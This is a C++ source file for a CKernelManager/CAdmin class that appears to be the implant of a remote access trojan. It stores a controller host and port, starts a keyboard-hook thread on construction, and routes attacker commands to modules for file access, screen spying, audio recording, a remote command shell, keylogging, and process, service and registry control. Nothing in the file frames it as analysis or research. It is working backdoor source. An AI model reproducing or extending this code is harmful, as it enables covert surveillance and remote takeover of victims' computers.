// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "KernelManager.h"
#include "loop.h"
#include "until.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CAdmin::m_strMasterHost[256] = {0};
UINT	CAdmin::m_nMasterPort = 80;
CAdmin::CAdmin(privatra*pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent,
		LPCTSTR lpszMasterHost, UINT nMasterPort) : Cprotm(pClient)
{
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表始激活
	m_bIsActived = false;
	// 创建一个监视键盘记录的线程
	// 键盘HOOK跟UNHOOK必须在同一个线程中
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);

}

CAdmin::~CAdmin()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

//---这里就处理主控端发送来的数据  每一种功能都有一个线程函数对应转到Loop_FileManager
// 加上激活
void CAdmin::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE:		// 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY:		// 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_AUDIO:				// 录音机
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL:				// 远程shell-CMD
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM:			// 进程
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		Sleep(100);
		break;
	case COMMAND_WSLIST:			// 窗口
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_WindowManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		Sleep(100);
		break;
	case COMMAND_SERVICES: // 服务管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ServicesManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_REGEDIT:          //注册表管理   
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_REPLAY_HEARTBEAT:	// 回复心跳包
		break;
	}	
}



bool CAdmin::IsActived()
{
	return	m_bIsActived;	
}